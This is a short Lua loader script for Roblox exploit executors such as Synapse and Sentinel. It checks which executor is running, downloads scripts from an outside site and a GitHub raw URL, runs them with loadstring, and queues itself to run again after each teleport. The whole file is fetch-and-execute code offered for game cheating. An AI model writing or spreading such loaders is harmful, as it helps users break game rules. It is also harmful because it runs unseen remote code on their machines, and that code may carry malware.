local buoi = [[
local Exploit = secure_load and "Sentinel" or syn and "Synapse"
loadstring(game:HttpGet("https://ego-d.xyz/Script?Exploit="..Exploit))()
loadstring(game:HttpGet('https://raw.githubusercontent.com/chimnguu/ngu/master/zua_buoi.lua'))()
]]

syn.queue_on_teleport(buoi)
